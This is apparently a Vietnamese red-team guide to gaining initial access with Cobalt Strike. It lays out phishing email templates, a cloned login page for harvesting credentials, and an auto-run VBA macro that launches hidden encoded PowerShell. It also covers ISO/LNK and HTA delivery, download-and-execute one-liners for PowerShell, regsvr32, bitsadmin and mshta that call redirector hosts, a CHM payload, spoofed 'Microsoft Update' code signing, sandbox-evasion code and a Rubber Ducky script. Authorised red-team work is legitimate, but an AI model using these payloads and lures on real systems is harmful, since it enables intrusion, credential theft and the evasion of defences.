# Cobalt Strike — Truy Cập Ban Đầu & Phishing (Tiếng Việt)

> Các kỹ thuật để có được quyền truy cập ban đầu vào môi trường mục tiêu sử dụng Cobalt Strike. Bao gồm spear phishing, delivery payload, web drive-by và truy cập qua USB.

---

## Mục Lục

1. [Chiến Lược Truy Cập Ban Đầu](#1-chiến-lược-truy-cập-ban-đầu)
2. [Spear Phishing với CS](#2-spear-phishing-với-cs)
3. [Payload Office Macro](#3-payload-office-macro)
4. [Delivery qua HTML Application (HTA)](#4-delivery-qua-html-application-hta)
5. [Delivery qua ISO / LNK (Phishing Hiện Đại)](#5-delivery-qua-iso--lnk-phishing-hiện-đại)
6. [Scripted Web Delivery](#6-scripted-web-delivery)
7. [Web Drive-By](#7-web-drive-by)
8. [Attachment Được Vũ Khí Hóa](#8-attachment-được-vũ-khí-hóa)
9. [Hosting Payload HTTPS](#9-hosting-payload-https)
10. [Mô Phỏng Người Dùng & Né Tránh Sandbox](#10-mô-phỏng-người-dùng--né-tránh-sandbox)
11. [Truy Cập Vật Lý (USB/Rubber Ducky)](#11-truy-cập-vật-lý-usbrubber-ducky)
12. [OPSEC Truy Cập Ban Đầu](#12-opsec-truy-cập-ban-đầu)

---

## 1. Chiến Lược Truy Cập Ban Đầu

### Cây Quyết Định Vector Tấn Công

```
Đánh giá mục tiêu
    │
    ├─ Web app bị exposed?
    │   → Khai thác web vuln → webshell → upload payload → thực thi
    │
    ├─ VPN/Citrix/OWA/VDI với thông tin xác thực yếu?
    │   → Password spray → thu thập cred hợp lệ → đăng nhập → thực thi payload
    │
    ├─ RDP đối ngoại?
    │   → Brute-force hoặc cred bị rò → RDP vào → thực thi
    │
    └─ Không có exposure bên ngoài rõ ràng?
        → Spear phishing là con đường chính
            ├─ Email với attachment (macro, ISO, LNK)
            ├─ Email với link (drive-by, scripted delivery)
            └─ Smishing/vishing (social engineering để thu thập cred)
```

### Sẵn Sàng Team Server CS Cho Phishing

Trước khi gửi phishing:
```
1. Profile Malleable C2 đã tải và kiểm tra
2. HTTPS listener với cert TLS hợp lệ đã tạo
3. Redirector đã cấu hình (nạn nhân KHÔNG nên thấy IP team server)
4. Payload staged hoặc stageless đã tạo và kiểm tra
5. Payload vượt qua quét AV (hoặc đã bị làm tối nghĩa để bypass)
6. Hosting payload đã xác nhận hoạt động
```

---

## 2. Spear Phishing với CS

### Module Spear Phishing của CS

```
Attacks → Spear Phish
  Targets:        targets.txt (danh sách địa chỉ email)
  Template:       phishing_template.html
  Attachment:     (để trống cho link-only, hoặc chỉ định payload đã tạo)
  Mail Server:    smtp.sendgrid.net:587
  Bounce Address: noreply@yourdomain.com
  From Name:      Nhóm Bảo Mật IT
```

### Định Dạng File Mục Tiêu (targets.txt)

```
First Last <target@corp.com>
John Smith <jsmith@corp.com>
Jane Doe <jdoe@corp.com>
```

### Tạo Template Email

```html
<!-- phishing_template.html -->
<!DOCTYPE html>
<html>
<body>
<p>Kính gửi %TARGET_FIRST%,</p>
<p>Vui lòng xem xét tài liệu cập nhật bảo mật đính kèm và làm theo hướng dẫn.</p>
<p>Đây là yêu cầu bắt buộc trước ngày <b>%DATE%</b>.</p>
<p>Nếu có câu hỏi, liên hệ nhóm Bảo Mật IT.</p>
<p>Trân trọng,<br>Nhóm Bảo Mật IT</p>
</body>
</html>
```

Biến template CS:
```
%TARGET_FIRST%    — tên của người nhận
%TARGET_LAST%     — họ của người nhận
%TARGET_EMAIL%    — email người nhận
%FROM%            — tên/email người gửi
%DATE%            — ngày hiện tại
```

### Theo Dõi Lượt Mở Phishing

CS tự động ghi log click link và mở attachment trong nhật ký chiến dịch:
```
View → Spear Phish → (chọn chiến dịch) → logs
```

---

## 3. Payload Office Macro

### Tạo Payload Macro

```
Attacks → Packages → MS Office Macro
  Listener: lab-https
```

CS tạo macro VBA để paste vào tài liệu Office.

### Cấu Trúc Macro (Tham Khảo)

```vba
' Ví dụ cấu trúc macro tối thiểu
Private Sub Auto_Open()
    Dim payload As String
    payload = "<lệnh_PS_đã_encode_base64>"
    
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell.exe -nop -w hidden -enc " & payload, 0, False
End Sub
```

### Chuẩn Bị Tài Liệu

1. Tạo macro trong CS
2. Mở Word/Excel
3. Developer → Visual Basic → paste macro vào ThisDocument / ThisWorkbook
4. Lưu dưới dạng `.doc` / `.xls` (định dạng cũ) hoặc `.xlsm` / `.docm` (macro-enabled)

### Social Engineering Hộp Thoại Enable Macros

```
"Tài liệu này được bảo vệ. Để xem nội dung, nhấp Enable Content."
"Tài liệu này được tạo ở phiên bản Office cũ hơn. Bật macros để xem đúng."
"Quét bảo mật hoàn tất — nhấp Enable Content để mở khóa tài liệu."
```

### Lưu Ý OPSEC Về Macro

Microsoft hiện chặn macro trong tài liệu tải từ internet (Mark of the Web — MOTW). Delivery qua:
- Email/SharePoint nội bộ (vùng tin cậy — MOTW thường không áp dụng)
- File ISO (cách ly MOTW khỏi file bên trong)
- Archive có mật khẩu (mật khẩu ngăn quét AV)

---

## 4. Delivery qua HTML Application (HTA)

### Tạo Payload HTA

```
Attacks → Web Drive-by → HTML Application
  Listener: lab-https
  Type:     Powershell
  URI:      /update
```

CS host HTA tại `http://teamserver/update.hta`. Gửi link cho nạn nhân:
```
"Vui lòng cài đặt bản cập nhật phần mềm cần thiết: http://redirector/update.hta"
```

Khi nạn nhân click và mở file `.hta`, `mshta.exe` thực thi payload nhúng sẵn.

### Lưu Ý OPSEC Về HTA

Windows SmartScreen gắn flag file `.hta` tải từ internet. Đường delivery tốt hơn:
- Dưới dạng email attachment
- Host trên site nội bộ tin cậy
- Qua social engineering để tải và chạy

---

## 5. Delivery qua ISO / LNK (Phishing Hiện Đại)

File ISO bypass MOTW trên các phiên bản Windows cũ. File bên trong ISO không kế thừa zone identifier.

### Quy Trình

```
1. Tạo payload (EXE stageless hoặc DLL sideload)
2. Tạo shortcut LNK trỏ đến payload
3. Đóng gói EXE + LNK vào file ISO
4. Gửi ISO như email attachment hoặc link

Luồng nạn nhân:
  Double-click ISO → Windows mount dưới dạng ký tự ổ đĩa
  Nạn nhân chỉ thấy LNK (EXE ẩn)
  Double-click LNK → chạy payload → Beacon
```

### Tạo File LNK

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("$env:TEMP\HoaDon.lnk")
$lnk.TargetPath        = "C:\Windows\System32\cmd.exe"
$lnk.Arguments         = "/c C:\Windows\System32\mshta.exe http://203.0.113.10/payload.hta"
$lnk.WorkingDirectory  = "C:\Windows\System32"
$lnk.IconLocation      = "%SystemRoot%\system32\shell32.dll,70"   # icon Word
$lnk.WindowStyle       = 7   # tối thiểu hóa
$lnk.Save()
```

### Tạo File ISO

```bash
# Linux:
mkdir iso_content
cp HoaDon.lnk iso_content/
cp beacon.exe iso_content/.beacon.exe    # ẩn với tiền tố .
mkisofs -o hoadon.iso iso_content/
```

### Nâng Cao: DLL Sideloading trong ISO

```
hoadon.iso
├── Xem_HoaDon.exe    (EXE hợp lệ đã ký tải DLL sideloaded)
├── version.dll       (độc hại — thay thế version.dll hệ thống)
└── (ẩn: beacon.shellcode hoặc beacon.dll)
```

---

## 6. Scripted Web Delivery

### Thiết Lập trong CS

```
Attacks → Web Drive-by → Scripted Web Delivery
  URI:      /update
  Listener: lab-https
  Type:     PowerShell
  Host:     IP redirector hoặc TS
```

CS hiển thị one-liner đã tạo:
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://redirector.com/update'))"
```

### Phương Thức Delivery One-Liner

```
# Qua RCE trong web application:
curl "https://target/vuln?cmd=powershell%20-nop%20-w%20hidden%20..."

# Qua Citrix/VDI desktop:
# Dán one-liner vào hộp thoại Run (Win+R)

# Qua shell access hiện có:
cmd.exe> powershell -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('...'))"
```

### Các Loại Delivery Khác

```
Type: regsvr32
  → regsvr32.exe /s /n /u /i:https://redirector.com/update.sct scrobj.dll

Type: bitsadmin
  → bitsadmin /transfer myJob /download /priority HIGH https://redirector.com/update.exe C:\Temp\update.exe & start C:\Temp\update.exe

Type: mshta
  → mshta.exe https://redirector.com/update.hta
```

---

## 7. Web Drive-By

### Clone Site Mục Tiêu

```
Attacks → Web Drive-by → Clone Site
  Clone URL:  https://corp-intranet.corp.com/login
  Local URI:  /portal
```

CS clone site và host tại `/portal`. Khi nạn nhân nhập thông tin xác thực, CS ghi lại.

### Thu Thập Thông Tin Xác Thực

CS ghi thông tin xác thực vào:
```
View → Web Log
```

---

## 8. Attachment Được Vũ Khí Hóa

### PDF với Payload Nhúng

Dùng PDF có JavaScript kích hoạt thực thi payload:

```
# Tốt hơn: dùng PDF hợp lệ với social engineering
# (click link bên trong PDF kích hoạt mshta/PowerShell)
```

### File CHM (Compiled HTML Help)

File CHM có thể thực thi JavaScript khi mở:

```html
<html>
<body>
<object id="x" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<param name="Command" value="ShortCut">
<param name="Item1" value=",cmd.exe,/c powershell.exe -nop -w hidden -enc <base64>">
</object>
<script>x.Click();</script>
</body>
</html>
```

---

## 9. Hosting Payload HTTPS

### Web Server Tích Hợp của CS

```
Attacks → Web Drive-by → Host File
  File:    /opt/payloads/beacon-stageless.exe
  URI:     /update.exe
  Host:    203.0.113.10:443
```

### Apache với Mime Masquerading

```bash
# Host EXE như PDF để bypass download:
cp beacon.exe /var/www/html/hoadon.pdf
echo 'Header set Content-Type "application/pdf"' >> /var/www/html/.htaccess
```

### EXE Đã Ký Để Giảm Phát Hiện AV

```bash
# Dùng osslsigncode (Linux):
osslsigncode sign -certs cert.pem -key key.pem \
    -n "Microsoft Update" -i "https://microsoft.com" \
    -in beacon.exe -out beacon_signed.exe
```

---

## 10. Mô Phỏng Người Dùng & Né Tránh Sandbox

### Kiểm Tra Chống Sandbox

```c
// Kiểm tra 1: Yêu cầu tương tác người dùng
if (GetSystemMetrics(SM_CXSCREEN) < 800) exit(0);  // quá nhỏ = VM

// Kiểm tra 2: Kiểm tra thời gian chạy
DWORD t1 = GetTickCount();
Sleep(10000);
DWORD t2 = GetTickCount();
if ((t2 - t1) < 9000) exit(0);  // thời gian tăng tốc = sandbox

// Kiểm tra 3: Kiểm tra domain join
LPWSTR buf = NULL;
NetGetJoinInformation(NULL, &buf, &type);
if (type != NetSetupDomainName) exit(0);  // không tham gia domain = sandbox/lab

// Kiểm tra 4: Số lượng tiến trình (sandbox thường có ít tiến trình)
// Đếm tiến trình qua CreateToolhelp32Snapshot — thoát nếu < 20
```

---

## 11. Truy Cập Vật Lý (USB/Rubber Ducky)

### Payload USB Rubber Ducky / Bash Bunny

```
# Script Rubber Ducky (DuckyScript):
DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://redirector.com/payload'))"
ENTER
```

### File LNK trên USB

Đặt shortcut LNK trong thư mục gốc USB. Nạn nhân điều hướng đến USB → double-click LNK:
```
shortcut trỏ đến: C:\Windows\System32\mshta.exe http://redirector.com/payload.hta
```

---

## 12. OPSEC Truy Cập Ban Đầu

### Gửi Phishing An Toàn

- **Dùng dịch vụ SMTP relay** (SendGrid, Amazon SES) — không phải team server của bạn
- **Domain người gửi:** đăng ký domain giống domain mục tiêu
- **DKIM/SPF/DMARC:** cấu hình cả ba trên domain gửi để vượt qua bộ lọc spam
- **Thời gian:** gửi trong giờ làm việc (9–11 SA hoặc 2–4 CH vào thứ Ba/Tư)
- **Mục tiêu:** giới hạn đợt đầu 5–10 người nhận để kiểm tra bộ lọc spam

### OPSEC Delivery Payload

- **Kiểm tra payload với Windows Defender tối thiểu** trước khi gửi
- **Payload không nên liên hệ C2 ngay lập tức** — thêm kiểm tra delay hoặc sandbox trước
- **Dùng redirectors** giữa payload và team server
- **Link tải xuống một lần** — sau lần tải đầu tiên, trả về 404

### Phân Loại Domain C2

```
# Kiểm tra phân loại domain trước khi dùng:
# - Umbrella: https://investigate.umbrella.com/
# - BlueCoat: https://sitereview.bluecoat.com/
# - Fortiguard: https://www.fortiguard.com/webfilter

# Phân loại tốt nhất cho domain phishing:
"Business and Economy", "Technology", "Information Technology"
# Tránh: "Newly Registered Domains", "Uncategorized"
```

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
